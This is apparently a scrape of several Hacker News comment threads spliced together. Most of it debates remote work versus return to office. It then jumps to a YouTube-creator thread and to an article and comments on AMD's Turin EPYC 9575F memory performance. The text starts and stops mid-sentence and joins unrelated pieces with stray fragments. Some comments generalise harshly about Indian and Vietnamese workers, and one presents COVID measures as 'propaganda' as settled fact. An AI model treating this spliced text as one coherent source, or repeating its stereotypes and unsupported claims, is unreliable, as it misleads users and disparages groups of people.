believe) that leaves productivity highest. reply noch 10 hours agorootparentprev> companies with wfh are driven out of business by those without This is unlikely. Notice the parent post said: >> I don't care about company KPI or efficiency, I care about my own well-being first and foremost […] So you have a situation where: - Most of your employees think of your company's success and their lifestyle as competing interests. - Most of your employees are focused on optimizing their lifestyle rather than the quality of their work. Essentially these are people who don't actually want to work and would be just as happy or happier on UBI. Now if you have another company whose employees believe in the company's mission, prioritize company success, don't see a necessary trade-off between work and lifestyle, and enjoy working with their teams in person, the latter company will outcompete the former. I recall one of my German managers said: \"The difference between workers today and the previous generation is that we lived to work, while they work to live.\" reply benterix 9 hours agorootparent> Now if you have another company whose employees believe in the company's mission, prioritize company success, don't see a necessary trade-off between work and lifestyle, and enjoy working with their teams in person This is a nice image you've painted but this company doesn't exist except in the minds of some CEOs and startup founders. You know what actually happens? A CEO announces RTO, people are outraged, everybody is looking at their options, those who manage to do it switch jobs immediately, those who can't do it at the next opportunity, the ones who are left are a combination of extroverts who finally can have endless interactions with those who want them and those who don't, and a bunch of disgruntled employees who don't give a fuck about your company because of the way you treated them. reply noch 7 hours agorootparent> You know what actually happens?

Colleagues just forgot about me despite the Zoom calls. reply benterix 5 hours agorootparent> I'm sorry you've had bad experiences. No, actually I haven't. I just have many colleagues who share their feelings with me. In my niche, all best-paid positions are remote only, I basically cooperate with teams from different continents, it's very rewarding. If someone tried to offer me a job forcing me to sit in an open plan office, I would laugh in their face, it seems so ridiculously absurd and unnecessary.

Ah. Well, second hand anecdotes are certainly appreciated. Thanks for sharing. > The possibility of WFH (for those who want it) is one of the best that happened to the working class since 5-day workweek. Does \"working class\" have a different meaning today? When I entered the job market it meant \"blue collar\" or manual labourer. You seem to be indicating that you're what used to be called \"knowledge worker\"? Nonetheless I agree with what you and others have said: wfh is great for optimizing an individual's lifestyle. Such a person, focused on their lifestyle, would probably do just as well if they were paid not to work. As a business owner however, the question is: what is best for the business? reply greentxt 4 hours agorootparent>As a business owner however, the question is: what is best for the business?

It depends. I think what's best for a business is having employees who want to win and want the business to win, as a primary goal. It's not really easy to make an adult feel valued because individuals have very different motivations and personalities, so good feelings as a goal is a shifting target. Of course, if it were easy to answer the question, probably the Harvard Business Review would be a single article and not many decades of publication, and the debate about WFH wouldn't even exist because everyone would feel valued already and the problem would be moot. reply pjc50 4 hours agorootparentprevAnyone who is dependent on labour rather than capital for their income is technically working class.

You better be good then or have a niche/rare skillset. There's no intrinsic right to remote work. Things will mostly revert to pre-covid, where only the best/most disciplined/highest performers are given the freedom to WFH. Sure, some companies will be 'remote first', but for the most part, you'll need to be a special hire with an exemption carved out. I'm already seeing this in my workplace. Managers are begging leadership for remote headcount but getting Bay area headcount instead. The teams getting remote headcount are the hardest to fill/most in demand skillsets, and almost always very senior. reply akoboldfrying 8 hours agorootparentprevIt sounds like you're advocating for a legally protected right to WFH. Are you? reply vbezhenar 39 minutes agorootparentI'm just expressing my opinion with regards to WFH. I work from home currently and it significantly changed by life to the better. Whether WFH should be legally protected, I don't know. I, personally, would be all for it, but at the same time I might underestimate some factors. Probably it makes sense to start with disabled people. There are not a lot of them, so potential negatives wouldn't hurt society that much and helping disabled people generally is well received. So basically if disabled person want to work in a job that could be done remotely and qualified for it, you must allow remote work, or something like that. Then you can follow with people caring for kids or disabled elders, they often must be at home, but at the same time they might have enough time to allow for some work. With enough statistics smart people could make an informed decision, whether forcing WFH worth it or not. reply Roark66 11 hours agoparentprevIt really depends on the people you're dealing with and their motivation. I've been working from home 100% since early 2016. You can make it more efficient in almost everything (I don't do creative work - so I don't know how that would go). Add to it better wellbeing, lower environmental impact, better access to skilled workforce and lower cost for the company and there should be no doubt WFH works 100% of the time in 99% of companies. I often had small team leaders, or mid managers tell me, \"but I don't really have that close personal relationship with some of the people WFH\". Yeah, sometimes you don't. When you have a tough problem in the office and your boss comes down you can show him how everyone is so busy trying to resolve it. You have a group of guys looking very busy here, a loud meeting over there. And you can just run from one group to the other looking extremely involved.... When people WFH you actually need to know what they are doing (very rare a manager will have a knowledge to fully understand a deep tech issue at such level) or you just trust people are doing their best. And that is very difficult to do when you don't know if they aren't having a birthday party with their kid and pretending to work when your world is caving in. The solution? You have to have good technical team leads and you rely on them in such situations. The horrible non-solution some companies try? Monitoring. Desktop casting, webcam always on. As long as you do that the productivity will plummet far below that of the office. Why? Because you give people another tool to show how busy they are \"at work\" other than the work itself. If you have no monitoring you have to prove you're working by doing actual work. We all know the products called \"mouse jiggle\" and such. If you cN get away with looking busy for the camera and moving the mouse many people will. All these people that pretend to work are a huge untapped economic potential. The key to utilising it is making them want to do the work. reply wiether 11 hours agoparentprevI totally agree with the core of your comment since that's exactly what I'm telling people when we have discussions around the topic. But I'm surprised how truer and truer this part sadly is : > I think a lot of people are talking past each other. I’ve mostly WFH since long before the pandemic, in many different capacities at many companies. A lot of people have tunnel vision and the reality is more nuanced than most allow. Your comment was at the top so I read it first. Then I browsed through the other threads and... Yes, that's quite sad. It's just simple empathy.

Of course. Apart from the WFH majority there also vocal proponents of hybrid (and I believe some who believe in full RTO, although these seem to be very few). The solution to this conundrum is to give people a choice. Yes, I worked for a few companies who do just that and everybody is happy! Those who want it, come to the office, those who don't, work from where they wish. Everybody's happy, and it's just that simple. The fact that most companies are afraid of even considering giving people a choice is a sign of... I don't know, a \"tunnel vision\"? reply mellosouls 8 hours agorootparentThe solution to this conundrum is to give people a choice. Except that if most choose full time remote, then those who favour hybrid (like me) or RTO have their choice made for them wrt collaboration and the other reasons given in the parent comment, so unfortunately, no, that's not really a solution. reply lolinder 5 hours agorootparentA bunch of reluctantly-at-the-office coworkers isn't going to be the collaboration utopia you're hoping for.

I don't think there's enough discussion about how bad remote collaboration tools are beyond \"Teams sux\". We need low latency, large screen, high resolution tools like Google's Project Starline, which is a good step in that direction. Voice cloning and deepfakes offer a plausible route to achieve very high fidelity in low bandwidth, but I think Zoom et. al. may be reluctant to explore that path because of its [currently] creepy perception. reply Unbeliever69 4 hours agoparentprevI personally had the opposite experience when it came to highly collaborative SMALL teams. In my last WFH project, lasting a couple of years, we worked 8 hours a day in a video call with our cameras turned on (most of the time). We did code collaboration in VSCode, design collaboration in Figma, and database/architectural collaboration in Miro. Everything else was via screen share. For our team it was HIGHLY effective. It didn't hurt that we all enjoyed working with each other. The choice to work in video calls with our cameras on was less about accountability and more about feeling connected. Nobody judged if your camera was off or you left the call. Easily the best years of my career. reply J_Shelby_J 12 hours agoparentprevThis is a good comment and I had to think about it for a minute. I do agree with you in practicality, but I also think in person works because most people flat out can’t or won’t take the time to communicate effectively in writing. Put them in a room and they’re suddenly forced to do it. But that said, just because most people can’t effectively communicate and instead use async communications like slack zombies is not my problem. If lawyers can handle contract negotiations over email, you can handle managing people with a ticketing systems and well written emails. I mean, by the sounds of it you won’t, and that’s ok, but that’s either a skill issue or a choice and I’m tired of pretending otherwise. reply jandrewrogers 42 minutes agorootparentMost people struggle to be efficient and effective at written communication. There are a huge number of people with good technical skills whose writing skills don't go much beyond writing a string of one-liners on Slack. And particularly in the younger generations, there is an enormous amount of resistance to anything that looks like detail-oriented long-form writing. In-person interactive discussion is much easier for people without these skills. It takes years of practice to become proficient at this, even if English is your native language. Everyone wants full-time remote but few people possess the communication skills to effectively work asynchronously and I see very few people intentionally trying to develop these skills or being willing to put in the many hours of work required. This may be the primary essential gap for remote: people need to dramatically improve their written communication skills. Until they do, they lack the skills to work remotely effectively. Ironically, we used to do asynchronous highly technical long-form discussions over email and on mailing lists. It is where I developed a lot of my writing skills, and this used to be the norm. It worked pretty well and some older open source projects still work this way. Now everyone hates email because it forces them to write. reply simonbarker87 11 hours agorootparentprevFor the vast majority of human existence the majority of communication was done verbally and in person. We’ve never communicated this much with text and most of that increase has probably come in the past, what, 20 years? I think rather than people being lazy/inept it’s more a case of our brains struggling to adapt to a way of communication that is thousands of years newer than speech. reply _gabe_ 4 hours agorootparentI really don’t understand what you’re saying here. Letters have existed for literally thousands of years at this point and people were able to communicate effectively through that. Several countries were founded and destroyed with coordination through written communication. I know plenty of people that still study the letters that were used to communicate while founding the United States. It seems to me that the last 20 years has led to a massive decrease in the effectiveness of written communication because people don’t have to be clear or concise anymore. reply simonbarker87 4 hours agorootparentPerhaps they still study those letters due to the ambiguity in understanding of what those people meant? We also don’t know that they understood each other as effectively as they would have if they communicated verbally in person. It is far easier to understand someone’s true meaning in person thanks to tone and body language. Communication in person is quicker because typing/writing is slow. That speed allows for faster ideation and iteration. It’s not impossible to communicate in written form at all but I don’t believe it’s as effective. To your first point, we write more emails, more DMs, more online comments, more text messages etc than ever before. We clearly communicate more in written form now than at any point in history. reply sph 11 hours agorootparentprevPeople adapted pretty well to being glued to a screen and reading order of magnitudes more than they were used to... or do most people just spend 12h in front of phones just scrolling pictures and watching videos?

If we’re talking about the IC work, the benefits of WFH are acknowledged even by its detractors.

I'm not sure I've found a tool that works for collaboration like a whiteboard. Digital solutions just never really worked in our company and we tried a few. On the flip side, open source projects function just fine with 100% remote work in different time zones. One thing I found with WFH pre-and-post Covid is the the 'Feynman moment'- \"If you cannot explain something in simple terms, you don't understand it\". Complex architectures in the minds of a few people, or the way creaky systems worked together, and so on. Or to put it another way, no documentation for offline folks, because no one considered it important. So much for all that boasting about business continuity plans. Which is almost a justification for being in the office, just to ask 'those people' how things works. It should also be a big red flag to management that things need fixing. But that's in the category of the management not seeing the financial benefit of doing it as there isn't an instant measurable up-front saving. (edit) 'those people' are typical senior devs, and senior devs are often most likely to want to, or can, WFH. reply nox101 6 hours agorootparentDocumentation is not a complete fix. So you have 1000 pages of documentation. Which page has the answer to your question? At work you ask your coworker with more experience \"Can you tell me how X works?\" and get an answer immediately. On remote you type in to chat \"Can you tell me how X works?\" you get an answer in 5 seconds, or 30 or 5 minutes, or 10 or 3hrs later, or never. Where as in the WFO example you were back to work immediately with little to no context switching, in the remote example you might have to just go work on something else (30-60 minute context switch) while you wait for an answer, then once you get it do another 30-60 minute context switch to get back into whatever it was you were doing. Maybe LLMs will solve this. Have them read the code and then be able to ask them questions about how it works? It's not just docs though. Maybe it's going over an idea. \"I'm thinking of solving this issue by doing X, what do you think?\" Same, WFO, immediate answer. WFH, answer in 5 secs to 5hrs+ or never. People will complain that getting a question takes them out of the zone. That might be true but it's never been true for any co-worker I've ever personally worked with. Nor with myself. It's always been easy and pleasant to answer a coworker's question.

It was not good for many. A lot of the value of being in an office is to reduce the barriers to social grooming and communicating. It's an emotional morale advantage, and some things are fixed faster or discovered faster when people talk to each other, and people do it better when in person than they do over shitty video calls, where the majority of people have crap setups, and despite your best efforts, will continue to have crap setups. Most people don't have the emotional ability and seriousness to compensate for the barriers that remote work brings up and make sure this important part of the work gets done.

Problem is most people aren’t disciplined:) reply AndrewDavis 17 hours agorootparentI'm substantially more productive at home. Not for any single reason, but as a result of small things coming together, for example. More sleep. I can set my alarm 15 minutes before I start work instead of an hour and a half. So I'm more refreshed. Commuting is mentally draining. I get sick less. Less often as a sardine in a tin can. More sleep probably helps too. Less distractions. There's just me in my home office room, at work there are 3 other people right next to me and a dozen within ear shot. I get home stuff done during work breaks. When I step away from my desk at work I do so because I need a break from what I'm doing, not a break from everything. But there's nothing else to do at work so I sit and do nothing. At home i: - unload the dishwasher - walk to the shops to buy items for dinner - sit in the park And I find doing those things more refreshing than sitting in the break room staring into space, or walking through the city in the noise of cars everywhere. So when I step back to my desk, at home I'm more refreshed ready to get back into it. This also means when I finish work for the day, in office it's another hour or so to get home and then do chores. Vs at home I finish work and I can go for a walk in the park because I've done my chores already. So I'm happier and less stressed. Which leads to less fatigue and burn out.

I think people who take the structure of their lives for granted say things like \"problem is most people aren't disciplined:)\", but this definition of discipline is directly related to how nice one's house and home life are. This pull-yourself-up-by-the-bootstraps mentality of \"disincline\" and \"work ethic\" lets you feel smug about the fact that you're doing better working from your nice home office as an L5 than your new intern who's working from the kitchen table in his family home next to three other people. reply hirvi74 17 hours agorootparentprev> WFH takes discipline That is bizarre to me.

I'm not saying offices don't have this problem too (many such stories of loud and obnoxious coworkers), but it can be harder to have these conversations with loved ones. Lots of people live in distracting, annoying places. If I open my window, I will hear some idiot gun it off the line in their straight-piped car from the stoplight near my apartment, several times an hour.

Globally much of the pro-office camp's public position is driven by personal leanings of CEOs who genuinely seem to have made the decisions without evidence, often it's something they're very grumpy about (hardly the best state of mind for good judgement) and often based on the assumption that company productivity is based on workers doing what they do (usually far from the truth, workers in general don't have anything like the same composition of tasks that CEOs do). It's unfortunate to that it has divided into camps, as there are bound to be cases/roles/groupings of workers where one approach comes out better and others where it's worse.

The home office debate is a great example of motivated reasoning - many people really like the personal benefits of home office which makes them look for things which confirm their view (with the bar for \"evidence\" being very low). The more passion you have, the more ridiculous form it takes. In normal debates, intelligent people usually admit that there are various trade-offs, and there are different POVs which might favor one trade-off over another. But in the home office debate, pro-HO seems to take a position that RTO cannot have any true, valid benefit, there's no real trade-off to be made, and therefore it can be explained only by ulterior motives or some conspiracy - usually hyper-controlling managers or this real estate conspiracy. reply ohmahjong 13 hours agorootparentIt does feel like a debate that is mostly qualitative, and from two different sides (employee and employer). My anecdotal experience has been that most employees I speak to are pretty clear about certain elements at the individual level but vary along many key axes: home office allows them to focus OR is too distracting; they miss the office culture OR hate the inefficiency of office smalltalk; they thrive on in-person connections OR thrive in focused isolation. There is also the topic of commuting, which most people don't love doing. Employers should largely be motivated by more quantitative thinking, although in practice this varies and the metrics themselves are notoriously difficult to quantify. reply erik_seaberg 14 hours agorootparentprevIt's all guesswork until we start measuring the impact of interruptions in open plan offices vs. homes (which is going to vary with families). reply cudgy 12 hours agorootparentDon’t forget the biggest interruption of all … the commute, sometimes 1-2 hours or more per day, just to get to the office and take advantage of the “benefits”. reply hackernewds 13 hours agorootparentprev2/3 of corporate real estate are empty and the commercial real estate market is due for a major crash. a lot of assets on companies balance sheets are for the offices that they own. or leave empty while leased reply mikeweiss 17 hours agorootparentprevI really don't think this is the case... I believe more than anything it's about the kind of personalities that make up people who are in charge of these decisions... Think about the types of people who are c-suite executives. They are likely people who prefer to be in an office setting.. at least most of the time. I don't think they like it very much coming into an office and seeing it mostly empty...

If someone is looking for status, and people looking up to them, etc, it would make sense that they would get much less that sort of attention if everyone is working remotely. Getting that through the Zoom is not exactly what it would be in real life. reply eastbound 7 hours agorootparentWhile we’re debating whether it’s a conspiracy from the elites or not, that eludes debates on the real important questions for a team lead/founder like me: Does the office provide a better environment for building things together? How much do people cheat in WFH situations? Do people ask for help at the right time in WFH? What are the right ratios: A few days per week, or a few weeks per year, or everyone at home because we don’t like each other? By the way, do people develop the same sense of workmateness when only meeting colleagues remotely? It seems all that union-talk “Boss is evil. Boss wants office. Office evil. Bad managers.” is kidnapping a real debate that is extremely important. Unless I’m proven otherwise: - People who WFH 2 days per week seem to spend 1hr less per day working, - 100%-Remote people never seem to belong to the company, and in fact the team of 4 that I’ve recruited still seems to be in the underproductive ramp-up after 8 months, and it only lasts 2-3 months with local people. Unless we stop debating whether real estate companies form a coup against the workers, I’ll never hear better arguments. reply mewpmewp2 6 hours agorootparent> Does the office provide a better environment for building things together? Not for me personally, because at home I can create the perfect environment. Tons of monitors, high noise satisfying mechanical keyboard, that I'm sure would bother others in the office, music that puts me in the flow, very large desk, really comfy clothes, the exact lighting, temperature, water and coffee and everything that is perfect for me. > Do people ask for help at the right time in WFH? I think that's a culture thing, but if not it should be talked about and Slack should be used for that, people should have good culture around when they respond or how responses are expected. > What are the right ratios: A few days per week, or a few weeks per year, or everyone at home because we don’t like each other? I think it should be optional however frequently everyone wants to come. Also not wanting to come to office doesn't mean to me that I don't like someone. I just don't want to have the obligation of socialising. I want to focus on what I want to focus at the time. > By the way, do people develop the same sense of workmateness when only meeting colleagues remotely? It's something I don't particularly care for. I enjoy building things, but I don't particularly care for team building or similar things. The thing is then this means that if I come to office or team building events, it's something that I have to actively spend energy on to pretend that I care and that this is fun. I get much less work done if there's pressure of socialisation, especially unrelated to the actual work since it's mentally draining and takes focus away from actual work. > - People who WFH 2 days per week seem to spend 1hr less per day working, In a healthy environment we shouldn't actually measure hours spent on working, but the value/output produced. I don't track how many hours I work. For all you know, maybe all I do is work when I'm sleeping so add another 8h there to my hours measured since my subconscious is deep at work. All I'm making sure is that my deliveries are hitting what is expected and more in terms of quality and quantity. It's another great aspect for me. If I have a low inspiration day, I will maybe do a hour of work just to make sure there's no fires, I'm not blocking anyone else and do whatever I want for the rest of the day. However if I have high inspiration day I will do a continuous 13h spurt without eating or going anywhere. No need to try myself fit neatly in a 8h schedule that just doesn't align with how my energy naturally operates. I don't need to justify how I operate and spend my hours to some arbitrary standards. All they see is that I deliver and if they are not control freaks, that should be enough for them. I've been in an environment where people don't doubt my deliveries, but maybe that's because I'm lucky to be in such an environment. > - 100%-Remote people never seem to belong to the company, and in fact the team of 4 that I’ve recruited still seems to be in the underproductive ramp-up after 8 months, and it only lasts 2-3 months with local people. Firstly - I don't belong to anyone to be clear. I'm not a slave. I belong to myself. Even if I went to the office I wouldn't \"belong\" to anyone. I wouldn't work for a company that would own me in the first place. In fact anyone can quit at any time. I'm here to build things, not to belong to anyone. The company has a product to build and the product provides value at scale, I'm here for building it to the best of my abilities. > I’ve recruited still seems to be in the underproductive ramp-up after 8 months I think that's a hiring problem (skill issue tbh). I'm being a bit snarky since you seemed to imply that people should belong to companies or at least you worded it that way. I've done a lot of hiring as well, and we are all remote and we managed to hire a great, motivated team. I have no doubt they are doing their things diligently and it's clearly visible even through Zoom since they talk about their technical challenges and it's clear what kind of effort they've put in. If they didn't put in the effort they wouldn't be able to talk about those challenges at such detail. And I do constantly think how great job we did hiring. reply Terr_ 20 hours agorootparentprev> real-estate value Separately but simultaneously, there are often local tax-benefits which depend on the company \"creating jobs\", and that's often defined in a way that means butts-in-offices downtown. reply notyourwork 20 hours agorootparentDing ding ding … this is the most overlooked aspect of the RTO/WFH dynamic. reply mvanbaak 18 hours agorootparentThis might be the nr 1 reason.

Perhaps workers could offer other costly signals - maybe regular arduous in person team building exercises that management can show their friends photos.

In the best case (ie. both sides are owned by you), such transfers are zero to slightly negative sum (from opportunity costs and costs associated with operating an office). In the typical case where you're renting from another CRE company, such transfers are definitely negative.

My point is that the examples that tech leaders give as the reason to go back to the office are simply male social rituals, held up as \"how we have good ideas and develop new hires\". They're not. They are all managers performing post-hoc rationalization theater And if those were the goals, they'd figure out an effective way to meet them that's better than \"chatting to john while taking a leak\". And the most galling thing is that every single one of my most impactful career moments didn't involve having a serendipitous conversation. It involved researching things I was interested in. I am for nerds and against tech-bros. reply arp242 4 hours agorootparentNo one is having serious conversations in the restroom. That would be profoundly bizarre and weird. And most people aren't saying that serendipitous conversations spur great big innovations or \"aha!\" moments, but rather that it just makes the process easier. Or that they prefer it. If yours are different then fine, but don't be so dismissive of other people's experiences and preferences. reply notyourwork 17 hours agorootparentprevI’m sorry but rude people exist everywhere and it’s not a tech thing. I’ve been in big tech for over a decade and I don’t have conversations in the bathroom. If you think WFH reduces these bro-relationships, you are being naive and they just become less accessible. reply datavirtue 21 hours agoparentprevWe simply are not going back, period.

It really is that simple. On the other hand, executives are clearly banking on a good old-fashioned recession to rein in the unruly and ungrateful employees. reply datavirtue 6 hours agorootparentIt's not just about RTO. The trend is bigger than that. It's just overall reality. If you need to go remote to fill a position then so be it. But some people have certain thoughts lodged squarely in their atrophied boomer brain about how everything has to be, no exceptions because feelings. The companies that don't have fog stuck in their head are going out and hiring remote and they have great cultures and are oozing productivity. That's the trend. reply l33tbro 21 hours agoprevI despair a little at this. If I can do my job at home, then surely somebody can do it in the global south in tandem with AI for peanuts. Client-facing stuff gets centralised to a smaller team of specialists, and the ship gets much tighter. How long until megacorps and SMEs actually execute this reality? The management class and their unnecessary underlings like me have only been so resilient because companies are still on the last days of this post-covid efficiency wave, coupled with the buffer of capital from the money that was created in the last few years. I'm usually not a doomer, but it's hard to see a way around the next downturn not creating irreversible culture change through AI offshoring and mass layoffs. reply ggm 20 hours agoparentThere are latent questions in your response. The fear is justified but equally, viewed from a distance, what is the \"worth\" of your price point, if the same job can be done and lift somebody out of poverty in the developing world? I'm not saying you're wrong. I'm asking what an economist or social historian might say, much as if a Lancashire cotton worker asked if his job was disappearing into cotton factories in Bangladesh. I share your fears btw. I'm just less sure I \"deserve\" the pay for my disappearing role(s) reply THENATHE 16 hours agorootparentIn the modern sense, this is very much a “I don’t want to do labor” issue. If all of the WFH jobs get sent overseas, the only thing left to do here is stuff that cannot be done on a computer from home, like construction, fabrication, forestry, food service, etc to name a few. A lot of us coder/designer/techy types are somewhat privileged in the idea that we can get paid a reasonable to high wage for doing something that is physically non-demanding and essentially only commands its price tag because of schooling and brainpower. I can imagine a lot of us are going to get very angry if we suddenly have to haul Sheetrock for a living. reply l33tbro 20 hours agorootparentprevCompletely agree. And it is funny how we put so much emphasis on developing our skills and abilities, when really our actual value is always determined by the market. I'm personally at peace with that, and would have a pretty hard time arguing against the logic of off-shoring my job. However, it's also rational to want to hold onto a favourable environmental niche for as long as possible! reply sjsisibdjcj 20 hours agorootparentHow has western society completely forgotten the point of a country? It is not the to create the most efficient economical configuration for routing wealth from the masses to the capital holders. Your value is not determined by the market, and those who tell you it is are only looking to exploit you.

I've never tried to run a business in India but I've spent quite a while there, and have worked on occasion with Indin freelancers. I can tell you that it's nothing to do with price point. There are cultural difficulties and language barriers, sure. But Vietnamese are generally highly conscientious, well educated, incredibly hard working people. And besides this, their culture (no strong religion, high value on women in then workplace, non confrontational, accepting of LGBT and different cultures) fits very well with Western values. It's not perfect - taking criticism on board is not a strong point of Vietnamese culture, for example. I fully understand it's not fair to dismiss huge country like India, and there are certainly many amazing Indian workers out there, and I've had to let go a fair number of Vietnamese slackers while building our team (as I would in any country). But statistically speaking, you'll probably have a far better time outsourcing to Vietnam over India. reply typewithrhythm 14 hours agorootparentprevI work for a company that has satellites in both India and Vietnam (among others). Working with Vietnam is much better, if someone knows English then they have a decent enough education; and their local institutions make it possible to verify credentials. They have less social issues besides. Indian outsourcing is almost a bit outdated... Effective machine translation and globally widespread english education, they really don't have much to offer. Their culture essentially makes it impossible to get predictable value out of a hire. reply csomar 14 hours agorootparentprev> our entire development team has been replaced.

It was called “outsourcing” 20 years ago when there was no AI. reply csomar 14 hours agorootparentYeah, the argument made no sense. If \"outsourcing\" will work this time (and it might), it's because the global south have developed quite a lot in education and infrastructure (pretty much all of the global south has good internet now, sometimes better than the US). reply hiAndrewQuinn 12 hours agoparentprevIt seems much less likely to me that this wouldn't have the effect of raising the global south up to the level of the global north, rather than drag down the global north to the global south, which would be a huge win for human flourishing. So I can't say I oppose it. Just as importantly: If you think this is likely to happen, why not invest in those countries now? If I'm right, they're likely to generate outsized returns as they catch up. If I'm wrong, the money you have invested in the global north will actually decrease as time goes on, while the money you have in the south stays steady, leaving you in a much better position than you probably would be otherwise. reply bvirb 19 hours agoparentprev> Going from 10 to 10,000 qualified candidates for a position allows a far more productive match Yeah going from 10 to 10k qualified candidates means wages go down. As companies get better and better at WFH the pool gets bigger and bigger. Personally I think some industries will go this way and others will go RTO, depending on how competitive they are (especially around R&D). Wages for relocation/RTO will end up rising. On the flip side: I've heard people saying software is going to be offshored and has no future at least since the 90s dot-com bust, they were still saying it in the 2000s wh",

A few of his newest videos have had him acting a bit like a host, interviewer and narrator. It’s also weird when some of these creators swap with somebody else, like veratasium has had his producer do some of the videos instead. The big reveal would be AvE. reply pests 1 hour agorootparentI noticed a few of the people I watch revealed their face last year before the big collab with Mark Rober. reply ravetcofx 1 hour agorootparentprevI used to like AvE till COVID. Then he became an anti-masker conspiratorial nutjob. reply cruffle_duffle 7 minutes agorootparentI mean he was 100% right about all of that; history will not look fondly upon societys hysterical reaction to Covid, so… I think he took a lot of shit for “coming out of the closet” in that regard and he’s never been the same. There was (and apparently still are) a lot of incredibly sanctimonious busy body’s out there who absolutely loved the power trip Covid gave them and they were more than happy to harass, threaten, and be incredibly disrespectful to people who disagreed with the mainstream narrative. As somebody in the same boat as AvE, watching people who you knew and respected turn against you the way so many people did is pretty brutal and fucks you up pretty good. Honestly it was scary as fuck how so people completely lost their minds after being fed non-stop fear porn and propaganda. Lots of parallels to some pretty fucked up atrocities—I can now see how “normal people” can turn so evil and corrupt they’d kill their neighbors and families. Multiple people I knew and respected wished me a horrific death for expressing my opinions… I’m sure if we continued this conversation and it was allowed on this forum you too would verbally wish at my death.

What was unhealthy is that it was dangerous to disagree.

People who thought we should hide in our homes until it was eradicated were similarly unaware of the implicit harms of that choice.

Unlike our prior Granite Rapids coverage where we just had a video, we have had hands-on with Turin, specifically the AMD EPYC 9575F, thanks to Jordan from StorageReview. This article is going to be a little different from our usual. It’s going to be shorter than usual because we have already covered the Zen 5 core both in mobile and in desktop and the differences between them, so this article will be focused on the memory subsystem changes that Turin has. Serve the Home has an excellent article that has the slides that AMD has put out for the launch of Turin. But because we have our own data, I thought that our data would be more interesting to dive into. Memory Bandwidth First, looking at the 1T results, we see that the 9575F can pull around 52 GB/s of memory read bandwidth, 48 GB/s of memory write bandwidth, and 95 GB/s of memory add (Read-Modify-Write) bandwidth. And looking at the results for how much memory bandwidth a single CCD can get, we can see that a single core can use just under half the total CCD memory read bandwidth, about 55% the total CCD memory write bandwidth, and over two-thirds the total CCD memory add bandwidth. Looking a bit closer at these results, you’ll notice that the 9575F has significantly higher bandwidth to a CCD compared to the desktop Zen 5 parts. And the reason for this is the 9575F has GMI3-W which means that it has 2 GMI links to the IO die instead of the single GMI link that the 9950X gets. And this is not only the only change to the GMI links on server. The GMI write link is now 32B per GMI link instead of the 16B per GMI link that you’d see on desktop Zen 5. Before moving to the full socket memory performance for the 9575F, let’s clear up the memory speeds that Turin supports. Turin has 12 channels of memory that can run up to DDR5-6400MT/s, however 6400MT/s is only supported on specific validated systems and only for 1 DIMM per channel. The system we had access to was running 6000MT/s for its memory, and DDR5-6000 MT/s is what most systems will support in a 1 DIMM per channel configuration. Should you want to run 2 DIMMs per channel, then your memory speeds drop to 4400 MT/s; and if you run 1 DIMM per channel in a motherboard with 2 DIMMs per channel then expect 5200 MT/s for your memory speed. Now, actually diving into the memory of the full 9575F and we see that we can get nearly 99% of the theoretical 576 GB/s of memory bandwidth using reads. Writes and adds are still an impressive 435 GB/s and 453 GB/s respectively. We also tested the socket to socket bandwidth on AMD’s Volcano Platform which only has 3 GMI links between the two 9575Fs. These results are very similar to our Bergamo results, which isn’t surprising because that system also had the same 3 GMI link setup. Memory Latency Moving to memory latency, we see that Turin’s unloaded memory latency is very similar to Genoa’s unloaded memory latency. At Hot Chips 2024, Ampere Computing showed a graph demonstrating the loaded memory latency of an AmpereOne chip and AMD’s Genoa CPU. Now Chester wanted to make a test similar to this, so he made a loaded latency test. The way that this test works is that it runs our memory bandwidth benchmark on either 7 cores on a CCD or 7 CCDs on the 9575F. This ensures that the IOD to CCD link or the whole memory system is fully loaded. Then, with the 8th core or 8th CCD, we run the memory latency test to see what the latency of the fully loaded system is. When a single CCD is loaded up on the 9575F, we see about a 39 nanosecond increase between the unloaded and loaded latency. When the whole system is loaded, we see about a 31 nanosecond increase between unloaded and loaded system latency. Looking at the single CCD results compared to the fully loaded system results, the 9575F has very similar memory latency behavior regardless if a single CCD is loaded or if the whole system is loaded. And lastly, everyone’s favorite graph, the core to core latency graph. For convenience, the list below are the numbers from the chart because a chart this big can be hard to read. Intra-CCD latency: ~45ns Inter-CCD latency: ~150ns Socket to Socket latency: ~260ns This is a latency increase compared to Genoa, especially within a CCD. Clock Speed Now, a note about the clock speeds we saw with the 9575F. All 64 cores could hit up to 5GHz in single threaded test. This is quite impressive, but we were able to get all 8 cores in a CCD to run at 5GHz in our memory bandwidth testing. And with all 128 threads chugging away on Cinebench 2024, we saw the 9575F sticking around the 4.3GHz range. Wendell from Level1Techs saw about 4.9GHz all core on a web server/TLS transaction workload, which is a less vectorized workload. Conclusion Realistically, AMD’s Turin is the generational update you’d normally expect. Not only does AMD have high core count SKUs (9755, 9965), which the hyperscalers will be picking up, they now also have lower core count, very high frequency SKUs (9575F) which the traditional enterprise market will appreciate. Apparently we now think 64 cores is ‘lower core count’. What a world we live in. Turin isn’t the step-function revolution that Naples to Rome was; it’s more akin to the evolution we saw with Milan to Genoa, which was a memory bandwidth increase, a core increase, and a core update. Nonetheless, this generation is set to excite a lot of people, as there’s lots of value here in a very competitive ecosystem.

Presumably this is for customers trying to minimize software costs that are based on \"per-core\" licensing. It really doesn't make much sense to have so few cores at such an expense, otherwise. Does Oracle still use this style of licensing? If so, they need to knock it off. The only other thing I can think of is some purpose like HFT may need to fit a whole algorithm in L3 for absolute minimum latency, and maybe they want only the best core in each chiplet? It's probably about software licenses, though. reply bob1029 6 hours agoparentAnother good example is any kind of discrete event simulation. Things like spiking neural networks are inherently single threaded if you are simulating them accurately (I.e., serialized through the pending spike queue). Being able to keep all the state in local cache and picking the fastest core to do the job is the best possible arrangement. The ability to run 16 in parallel simply reduces the search space by the same factor. Worrying about inter CCD latency isn't a thing for these kinds of problems. The amount of bandwidth between cores is minimal, even if we were doing something like a genetic algorithm with periodic crossover between physical cores. reply londons_explore 7 hours agoparentprevPlenty of applications are single threaded and it's cheaper to spend thousands on a super fast CPU to run it as fast as possible than spend tens of thousands on a programmer to rewrite the code to be more parallel. And like you say, plenty of times it is infeasible to rewrite the code because its third party code for which you don't have the source or the rights. reply Jestzer 6 hours agoparentprevMATLAB Parallel Server also does per-core licensing. https://www.mathworks.com/products/matlab-parallel-server/li.... reply bee_rider 3 hours agoparentprev512 MB of cache, wow. A couple years ago I noticed that some Xeons I was using had a much cache as the ram in the systems I had growing up (millennial, so, we’re not talking about ancient commodores or whatever; real usable computers that could play Quake and everything). But 512MB? That’s roomy. Could Puppy Linux just be held entirely in L3 cache? reply zamadatix 35 minutes 